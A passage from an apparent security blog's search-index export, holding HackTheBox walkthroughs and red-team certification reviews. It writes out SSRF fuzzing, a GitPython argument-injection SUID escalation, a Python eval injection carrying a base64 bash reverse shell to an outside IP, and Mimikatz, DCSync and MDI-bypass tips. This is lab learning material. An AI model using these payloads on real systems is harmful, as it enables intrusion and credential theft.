[{"content":"Enumeration Scanning with nmap All port scanning is being perform with the following command:\nnmap -p- --min-rate 2500 10.10.11.20 -oN allports.txt The following shows the result of the command:\nIt shows port 22, 80 as open. In order to find the version of services, service version enumeration is being performed with the following command.\nnmap -p 22,80 10.10.11.20 -sC -sV -O -oN serviceVersion.txt As the web server is running, so the website is being browsed and the following is the hosted web server. The following email found, but it was of no use.\nsubmissions@tiempoarriba.htb\nDirectory Enumeration: Dirsearch is being used for enumerating all the available directories in the target server.\nCommand:\ndirsearch http://editorial.htb/ As shown, the two directories /about and /upload are being found.\nThe /upload directory has a form to upload the book information. Tried the file upload vulnerability in the file upload. But it is not rendering the uploaded file in the web page, instead, it is serving the uploaded file for downloading.\nThere\u0026rsquo;s another option to upload the URL of the book cover. This feature has an SSRF vulnerability. This can be confirmed by running a nc listener, and sending request to our own listener in the book cover URL as shown below: A request can be sent to the internal server to get information from there. So, a request is being sent to 127.0.0.1:80 as shown:\nIt takes a bit of time, and responded with a jpeg file. For enumerating other ports, I tried enumerating a few other ports, but all were giving the same jpeg file as shown: Enumerating the Open Ports in the Internal Server with FFUF: Replaced the port number in burp with FUZZ as shown below: Saved the burp request in file called req.txt and run ffuf with the following command:\nffuf -request req.txt -request-proto http -w \u0026lt;(seq 1 65535) -fr \u0026#34;1630734277837_ebe62757b6e0.jpeg\u0026#34; This will use the req.txt to fuzz the port with the wordlist of sequence from 1 to 65535 and will not show all the responses containing the regex 1630734277837_ebe62757b6e0.jpeg.\nPort 5000 was sending a different response. That means, this port is open.\nSent request to port 5000 as shown below: It gave me a URL to download a file.\nThe file contains a list of end points. I sent request to the /api/latest/metadata/messages/authors endpoint, which again gave ma another URL. I visited that URL and got a password of dev user as shown: Getting Access of the Machine The password was used to get access of the machine through SSH as the dev user.\nLiteral Movement: The apps directory has a .git directory, which contains the different version of the code.\nThere were different files which were stagged but not committed as shown:\nCommand Used:\ngit status The log of git showed interesting commit with message downgrading prod to dev: Command Used:\ngit log This commit is being shown with the command:\ngit show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae This showed the password of prod user as shown.\nPrivilege Escalation There\u0026rsquo;s an script, which the prod user can run as the root user as shown: The following is the content of file:\n#!/usr/bin/python3 import os import sys from git import Repo os.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;) url_to_clone = sys.argv[1] r = Repo.init(\u0026#39;\u0026#39;, bare=True) r.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) Here, the git module has the vulnerability. I searched about python git priv esc and got this: https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858\nThe following can be supplied as the argument to the script for executing command as root:\next::sh -c touch% /tmp/pwned This will create /tmp/pwned. So, in order to exploit this i run this command, which will copy the root shell and will set its suid bit, we can use that shell later to get root access.\next::sh -c cp /bin/bash /tmp/bash; chmod +s /tmp/bash # we have to add % before each space so it will be like this ext::sh -c cp% /bin/bash% /tmp/bash;% chmod% +s% /tmp/bash # The final payload will be: /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c cp% /bin/bash% /tmp/bash;% chmod% +s% /tmp/bash\u0026#39; The following shows the result of this command:\nIt displayed some kind of error, but we can ignore that as our code executed already. I used the following command to interact with the shell and get access as root:\n/tmp/bash -p Hence, the machine is ROOTED!\n","permalink":"http://localhost:1313/posts/machine-writeups/editorial-hackthebox/","summary":"\u003ch2 id=\"enumeration\"\u003eEnumeration\u003c/h2\u003e\n\u003ch3 id=\"scanning-with-nmap\"\u003eScanning with nmap\u003c/h3\u003e\n\u003cp\u003eAll port scanning is being perform with the following command:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -p- --min-rate 2500 10.10.11.20 -oN allports.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThe following shows the result of the command:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/Editorial-HackTheBox/1.png\"\u003e\u003c/p\u003e\n\u003cp\u003eIt shows port 22, 80 as open. In order to find the version of services, service version enumeration is being performed with the following command.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -p 22,80 10.10.11.20 -sC -sV -O -oN serviceVersion.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/Editorial-HackTheBox/2.png\"\u003e\u003c/p\u003e\n\u003cp\u003eAs the web server is running, so the website is being browsed and the following is the hosted web server.\n\u003cimg loading=\"lazy\" src=\"/writeups/Editorial-HackTheBox/3.png\"\u003e\u003c/p\u003e","title":"HackTheBox Editorial machine Walkthrough"},{"content":"Enumeration Run nmap all port scanning with the following command:\nnmap -p- 10.10.11.208 --min-rate 2500 -T4 -oN nmap/allPorts.txt The following is the nmap all ports output:\nAs the port 22 and 80 are open. Now run the service enumeration to find out the version of services running on the target. The following command was used for the service version enumeration.\nnmap -A 10.10.11.208 -p 22,80 -oN nmap/ServiceVersion.txt The result of the command shows below: This shows the searcher.htb as the hostname. So updated it in the /etc/hosts file.\nVisited the website, which is being shown below:\nAt the end, the version of the Searchor is shown, which is Searchor 2.4.0. Quickly searched if there\u0026rsquo;s any vulnerabilities related to this version. I came to know about the Command Injection vulnerability in this version and found an exploit code for that.\nThe exploit code can be used to get a reverse shell in easy way. But there\u0026rsquo;s another manual way, through which the command injection vulnerability can be exploited. I have explained both ways below.\nExploitation Reverse Shell Through the Exploit Code: The exploit.sh is being downloaded from the following Github repository. Link: https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection\nCommand:\n./exploit.sh http://searcher.htb 10.10.16.17 # For Exploiting the Vulnerability nc -lvnp 9001 # Listener for the reverse shell The reverse shell is obtained as shown: Reverse Shell in the Manual Way Opened Burp Suite for gaining access in manual way.\nThe site is sending POST request to /search with the parameters engine and query as shown below: Added a payload with the value of the query parameter to check if its behaviour changes with special characters.\nAdded special character list by SecList as the list: After checking I found that it was not giving any result for the characters ' and \\. So, The logic here was, it was executing some python command like eval. The logic can be applied that it was doing something like this:\neval(\u0026#34;print(\u0026#39;a\u0026#39;)\u0026#34;) So, according to the logic the following command will print aHello.\na\u0026#39;)+print(\u0026#34;Hello\u0026#34;)# So, tried this It printed Hello. It means it is executing out python command. In order to get command execution I tried the following command:\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;\u0026lt;CMD\u0026gt;\u0026#39;) __import__(\u0026#39;os\u0026#39;).system(\u0026#39;id\u0026#39;) # Final Payload a\u0026#39;)+__import__(\u0026#39;os\u0026#39;).system(\u0026#39;id\u0026#39;)# Run the above after URL encoding and we got a code execution as shown below: Now, we have to get a reverse shell somehow.\nI used the following bash reverse shell:\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.157/9001 0\u0026gt;\u0026amp;1 # Encoding it as Base64 echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.157/9001 0\u0026gt;\u0026amp;1\u0026#39; | base64 The final Payload:\n‚îå‚îÄ‚îÄ(root„âøkali)-[~/Desktop/htb/Busqueda] ‚îî‚îÄ# echo \u0026#39;bash -i \u0026amp;\u0026gt; /dev/tcp/10.10.16.17/9001 0\u0026gt;\u0026amp;1 \u0026#39; | base64 YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNi4xNy85MDAxICAwPiYxICAK The following will be send as the request\na\u0026#39;)+__import__(\u0026#39;os\u0026#39;).system(\u0026#39;echo \u0026#34;YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNi4xNy85MDAxICAwPiYxICAK\u0026#34; | base64 -d | bash\u0026#39;)# Got the reverse shell as shown below: Privilege Escalation After gaining the initial access, I explored the current directory. It contain a .git folder. The config of the git repository contains a password as shown below: I tried logging in for the current user with SSH, and I was successful because this was the password for the current user svc. I checked for Sudo privilege escalation and found that the current user can run the system-checkup.py as root. The following shows the result of sudo -l: I tried, checking the content of this script, but the file was not readable by the current user as shown:\nThe file can only be executed, so I tried executing the file as root user with the following command:\nsudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py The following three commands can be executed with it as shown: Seems like the docker-inspect can not be executed as it is: I checked online for its usage and the following command can be used to get details:\ndocker inspect --format=\u0026#39;{{json .Config}}\u0026#39; $INSTANCE_ID # Adjust it according to our usage: sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format=\u0026#39;{{json .Config}}\u0026#39; 960873171e2e Run the above command and got this data as shown: This gave us another password, which initially didn\u0026rsquo;t understand. But after further enumeration, I figured out that there was another website running on the gitea.searcher.htb. This was found on the apache2 enabled sites as shown: Added this website in the /etc/hosts as well and visited it. This was asking for the username and password. So, used administrator as the username and the above found password as the password. I was able to logged in as an administrator here.\nThe script we found earlier were listed here and were readable as shown below: So, we can analyse these files to find any vulnerability.\nIt is found that when the full-checkup argument is provided to the script, it runs ./full-checkup.sh without full path. So, we can create our own file in any writeable directory and can get reverse shell as root, as root will be executing that file.\nThe vulnerable part of the code: Created the following code in the /dev/shm with name full-checkup.sh:\n#!/bin/bash cp /bin/bash /tmp/bash; chmod +s /tmp/bash The execute permission is being given to the script and run the following command:\nsudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup Now, the root shell is copied to the /tmp folder as shown below. The bash shell is being used with the following command.\n/tmp/bash -p The following shows the result of the commands: So, this gives us root access of the machine.\n","permalink":"http://localhost:1313/posts/machine-writeups/busqueda-hackthebox/","summary":"\u003ch2 id=\"enumeration\"\u003eEnumeration\u003c/h2\u003e\n\u003cp\u003eRun nmap all port scanning with the following command:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -p- 10.10.11.208 --min-rate 2500 -T4 -oN nmap/allPorts.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThe following is the nmap all ports output:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/writeups/busqueda-HackTheBox/2.png\"\u003e\u003c/p\u003e\n\u003cp\u003eAs the port 22 and 80 are open. Now run the service enumeration to find out the version of services running on the target.\nThe following command was used for the service version enumeration.\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003enmap -A 10.10.11.208 -p 22,80 -oN nmap/ServiceVersion.txt\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eThe result of the command shows below:\n\u003cimg loading=\"lazy\" src=\"/writeups/busqueda-HackTheBox/3.png\"\u003e\u003c/p\u003e","title":"HackTheBox Busqueda machine Walkthrough"},{"content":"Enumeration All the ports were scanned.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/hackthebox/keeper] ‚îî‚îÄ$ nmap -p- --min-rate 1000 keeper.htb --oN AllPortScan.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 18:13 EDT Nmap scan report for keeper.htb (10.10.11.227) Host is up (0.032s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http The ssh and http port were open.\nThe service version and OS enumeration is being carried out with the following command.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/hackthebox/keeper] ‚îî‚îÄ$ nmap -p22,80 -A keeper.htb --oN ServiceVersion.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 18:14 EDT Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.30% done; ETC: 18:14 (0:00:00 remaining) Nmap scan report for keeper.htb (10.10.11.227) Host is up (0.030s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesnt have a title (text/html). |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel It shows the web server is using nginx and the underlying OS is Linux.\nThe website is being browsed.\nAdded the tickets.keeper.htb in the hosts file, in order to access the tickets.keeper.htb.\nThe tickets.keeper.htb has a login page as shown below: Searched about the default credentials of Request Tracker and found the following credentials: These credentials worked and I logged into the site as shown. Under Admin\u0026gt;Users, selected the lnorgaard. It shows the ssh password of this user as shown: Gaining Access: Used the found password to log into the ssh. There is a memory dump file in the home directory of the user lnorgaard as shown above.\nTransferred it in my own kali machine and extracted it. This was the dump of the Keepass application. The keepass application below 2.54 has the vulnerability, in which the master password is stored in the memory of the system. There is an official POC https://github.com/vdohney/keepass-password-dumper.git, which can be used to obtain the master password from the memory. As I was not having the dotnet environment installed, I found the alternative python based implementation HERE . So I used the python based implementation. I used this one and retrieved the password as shown below. Privilege Escalation The above returned weird sort of password, so I googled it and considered the suggested word as password.\nEntered the password, which worked. There was a putty key file in the keeper.htb, I checked the content of this. Saved this putty key in the file and run the following command to convert this into the format of openssh private key.\nputtygen putty-pass-file -O private-openssh -o id_rsa # Here # -O: the format in which we want to convert the putty key file # -o: The file where we want to save the generated file. Used this SSH private key to log in to to the system as root used.\nHence, machine it rooted!!\n","permalink":"http://localhost:1313/posts/machine-writeups/keeper-hackthebox/","summary":"\u003ch2 id=\"enumeration\"\u003eEnumeration\u003c/h2\u003e\n\u003cp\u003eAll the ports were scanned.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îå‚îÄ‚îÄ\u003cspan class=\"o\"\u003e(\u003c/span\u003ekali„âøkali\u003cspan class=\"o\"\u003e)\u003c/span\u003e-\u003cspan class=\"o\"\u003e[\u003c/span\u003e~/Desktop/hackthebox/keeper\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îî‚îÄ$ nmap -p- --min-rate \u003cspan class=\"m\"\u003e1000\u003c/span\u003e keeper.htb --oN AllPortScan.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.94SVN \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2024-08-18 18:13 EDT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e keeper.htb \u003cspan class=\"o\"\u003e(\u003c/span\u003e10.10.11.227\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.032s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNot shown: \u003cspan class=\"m\"\u003e65533\u003c/span\u003e closed tcp ports \u003cspan class=\"o\"\u003e(\u003c/span\u003econn-refused\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT   STATE SERVICE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open  ssh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThe ssh and http port were open.\u003c/p\u003e\n\u003cp\u003eThe service version and OS enumeration is being carried out with the following command.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îå‚îÄ‚îÄ\u003cspan class=\"o\"\u003e(\u003c/span\u003ekali„âøkali\u003cspan class=\"o\"\u003e)\u003c/span\u003e-\u003cspan class=\"o\"\u003e[\u003c/span\u003e~/Desktop/hackthebox/keeper\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e‚îî‚îÄ$ nmap -p22,80 -A keeper.htb --oN ServiceVersion.txt                    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStarting Nmap 7.94SVN \u003cspan class=\"o\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan class=\"o\"\u003e)\u003c/span\u003e at 2024-08-18 18:14 EDT\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eStats: 0:00:07 elapsed\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e hosts completed \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e up\u003cspan class=\"o\"\u003e)\u003c/span\u003e, \u003cspan class=\"m\"\u003e1\u003c/span\u003e undergoing Script Scan\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNSE Timing: About 99.30% \u003cspan class=\"k\"\u003edone\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e ETC: 18:14 \u003cspan class=\"o\"\u003e(\u003c/span\u003e0:00:00 remaining\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNmap scan report \u003cspan class=\"k\"\u003efor\u003c/span\u003e keeper.htb \u003cspan class=\"o\"\u003e(\u003c/span\u003e10.10.11.227\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost is up \u003cspan class=\"o\"\u003e(\u003c/span\u003e0.030s latency\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT   STATE SERVICE VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e protocol 2.0\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssh-hostkey: \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   \u003cspan class=\"m\"\u003e256\u003c/span\u003e 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e \u003cspan class=\"o\"\u003e(\u003c/span\u003eECDSA\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  \u003cspan class=\"m\"\u003e256\u003c/span\u003e 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http    nginx 1.18.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Site doesnt have a title \u003cspan class=\"o\"\u003e(\u003c/span\u003etext/html\u003cspan class=\"o\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: nginx/1.18.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eUbuntu\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eIt shows the web server is using nginx and the underlying OS is Linux.\u003c/p\u003e","title":"HackTheBox keeper machine Walkthrough"},{"content":"What is CRTP? Certified Red Team Professional (CRTP) is beginner level red teaming certification focused on Active Directory by Altered Security. This certification exam proves that certified professionals have sufficient knowledge to perform Red Teaming engagement on an Active Directory environment.\nPrice $249 (With 30 Days Lab Access) Passing Score OS command execution on all the five target servers. Allowed Time 25 hours exam time, and additional 48 hours for report. Proctored? No Link to Purchase Here Exam Focused Areas Red Teaming, Active Directory, MDI Bypass Packages Training is included with the certification exam. There are different packages depending on the lab access time and type of training. There are two types of training that can be followed.\nBootcamps: These are the instructor led bootcamps for 4 week. In this training, you can interact with the instructor and can follow along. On Demand: This is the self paced training, where the recordings of the previous bootcamp session will be provided as the training videos. You can watch those videos on your own at any time. For more information about different packages check the purchase option on the following link: https://www.alteredsecurity.com/adlab\nMy Experience with the Course I chose the on-demand course with 30 days of lab access. I found the videos a bit lengthy compared to other courses I\u0026rsquo;ve taken. There\u0026rsquo;s no LMS system; instead, you\u0026rsquo;ll be provided with a Google Drive link to the videos. This is because, rather than focusing on the LMS platform, they have prioritized the quality of the training. The learning from those lengthy videos is simply amazing. Nikhil Mittal is a well-known figure in AD Security. He not only teaches the topic but also shares insights on whether an attack would be detected, what type of logging or security solution would catch a specific attack, and how to bypass those security measures. He also shares his experiences related to those attacks.\nIn the course, the instructor first teaches the theory and then demonstrates how to solve the lab on their platform for the related topic. A great aspect is that you get lifetime access to the course material, which remains accessible even after the exam.\nMy Experience with the Labs In the lab, you will be given access to a student VM, which is a part of AD enviroment with multiple machines and forests. You need to apply what you\u0026rsquo;ve learned to access these machines in different ways.\nThe mistake I made was trying to do both the lab and the course simultaneously. Before starting the course, I began my lab timer, which was limited to 30 days. While progressing through the course, I completed a few of the initial labs. However, I then decided to focus on finishing the course first. Due to my busy schedule, I completed the course but couldn\u0026rsquo;t finish all the labs in time. So, I recommend finishing the course at least once before starting the lab timer.\nFortunately, the lab manual with detailed commands, results, and walkthroughs was available even after the 30-day lab period expired, which was a great help. I used these resources to go through all the lab topics.\nExam Environment In the exam, you are given a student user account on a machine with low-level access. The goal of the exam is to achieve OS Command injection on five servers. The names of all the servers will be provided to you once you start the certification exam. There are unlimited restarts available, so you can restart any machine at any time. Make use of this often, as sometimes things start working after a machine is restarted.\nYou also have two chances to reset the entire exam environment, which will reset all the machines and provide you with fresh network instance, including the VPN configuration. I wouldn\u0026rsquo;t recommend using this option unless you‚Äôve encountered a serious issue, as the reset process takes 20-25 minutes, which would waste valuable time. Instead, use the quick restart option whenever possible.\nMy Experience with the Exam I started the exam in the morning, with hope that I could access all the machines by evening or bedtime. However, I was mistaken, as it took me a full 25 hours. I was extremely tired after 25 sleepless hours.\nThe first issue I encountered was bypassing the MDI. All my scripts were getting blocked since it was a fully patched Windows environment. I realized my mistake after some time and followed the process taught in the course to handle this.\nNext, my goal was to gain elevated privileges on my own machine, which I managed to do quickly. I then found the vulnerability for the first target quickly but got stuck trying to find the correct way to exploit it. Follow the tips I‚Äôve shared below to avoid this issue.\nThe second machine was easy, and I gained access very quickly. The third machine was very confusing for me and took more than 10-12 hours. This one requires some additional research, as I couldn‚Äôt get around it using the methods taught in the course. Eventually, I found a way to bypass it.\nThe fourth machine was also straightforward, and I completed it quickly. The fifth and final machine required accessing a machine in another domain. This was also easy when I followed the process taught in the course.\nReporting Once the exam time ended, I had 48 hours to submit the report. After the exam, the first thing I did was get some much-needed sleep. Then, I worked on the report slowly and finished it the next day. I emailed the report and, five days later, received an email starting with, \u0026lsquo;Congratulations! You have cleared the examination! You are now a Certified Red Team Professional.\u0026rsquo;\nTips for the Exam Try to have different Mimikatz versions (exe,ps1 \u0026amp; etc ), if one does not work, use the second one. Always run Mimikatz with NT Authority System level access. It will throw errors sometimes even if you are administrator or in the administrator group. So always have NT Authority System level access and then run it. If Mimikatz.ps1 gives error of 64 bit compatibility, use mimikatz.exe. Always try to run Rubeus.exe on cmd.exe not on powershell.exe without Invishell. When any script catch by MDI, use Download Execute Cradles. Use DCSync on DC only, and simple credential dumping on machine after getting NT Authority System. Password extraction from lsass process is definitely helpful, but never ignore creds vaults. I hope you learned something from this review and that these tips help you on your CRTP journey. I wish you the best of luck on your Active Directory penetration testing journey. Lets get connected on LinkedIn, and Feel free to message me on¬†if you have any queries.\nSee you with the next review. Hopefully its OSCPü§û\n","permalink":"http://localhost:1313/posts/certification-reviews/crtp/","summary":"\u003ch1 id=\"what-is-crtp\"\u003eWhat is CRTP?\u003c/h1\u003e\n\u003cp\u003eCertified Red Team Professional (CRTP) is beginner level red teaming certification focused on Active Directory by Altered Security. This certification exam proves that certified professionals have sufficient knowledge to perform Red Teaming engagement on an Active Directory environment.\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003ePrice\u003c/th\u003e\n          \u003cth\u003e$249 (With 30 Days Lab Access)\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePassing Score\u003c/td\u003e\n          \u003ctd\u003eOS command execution on all the five target servers.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eAllowed Time\u003c/td\u003e\n          \u003ctd\u003e25 hours exam time, and additional 48 hours for report.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eProctored?\u003c/td\u003e\n          \u003ctd\u003eNo\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLink to Purchase\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://www.alteredsecurity.com/adlab\"\u003eHere\u003c/a\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eExam Focused Areas\u003c/td\u003e\n          \u003ctd\u003eRed Teaming, Active Directory, MDI Bypass\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch1 id=\"packages\"\u003ePackages\u003c/h1\u003e\n\u003cp\u003eTraining is included with the certification exam. There are different packages depending on the lab access time and type of training.\nThere are two types of training that can be followed.\u003c/p\u003e","title":"Altered Security CRTP Review"},{"content":"What is eMAPT? eLearn Mobile Application Penetration Tester (eMAPT) is a Mobile Application Penetration Testing certification by INE (formerly known as eLearnSecurity). This exam proves that certified professionals have adequate knowledge to perform Penetration Testing of mobile applications (Android and IOS) and can provide exploit application.\nPrice 400$ (Without training) Training Cost 749$ Passing score (Working Android Application as POC) Allowed time 7 days Proctored? No Link to purchase Here Exam Focused Areas Android Application Penetration Testing, Android Application Development My Experience: I started the exam in the morning of 18th May 2024, uploaded the report on 20th May 2024 and received the result on 29th May 2024.\nI prepared for this exam with the INE official course which is designed for mobile application penetration testing (Link is here). This course covers everything needed to pass the exam. But you may not find it as much interactive as you can expect, as it has lengthy slides to cover most of the topics. The course has the following two sections.\nAndroid \u0026amp; Mobile App Pen testing iOS \u0026amp; Mobile App Pen testing I also went through the TCM Security Mobile Application course for the preparation of this exam.\nExam Info Once you start the exam, you will be given with two android mobile applications with the letter of engagement. This engagement letter outlines the objectives you need to meet to pass the exam. The requirement to pass the exam is to provide a working android mobile application which can exploit both the given applications.\nTimeline I started the exam on 18th May, and I was able to identify the vulnerabilities in the first hour. I spent the first day on analysing the working of both the applications and exploiting these through CLI. The second day I started learning android studio and built a few test android applications. The next day, I built my exploit application which was able to exploit both the given application to perform the required tasks. I tested the built application on different emulators with different API versions as well as on my own mobile phone.\nExam Review The exam was not that much difficult as I was expecting. It was all about understanding the working of the application by reverse engineering it, retrieving data from the application using the provided functionalities and reconstructing another application by reversing the process. By reversing I mean, in some phases you will encounter different situation e.g. encryption, where you will have to reverse the same process to decrypt the given data. In the exam, you will not be asked to get a flag or to root any system, in fact you will get the answers in front of you within a few minutes. The requirement to pass the exam is to provide an application which can exploit those vulnerabilities automatically.\nTips for the Exam: Test the applications on at least one rooted and one non rooted emulator 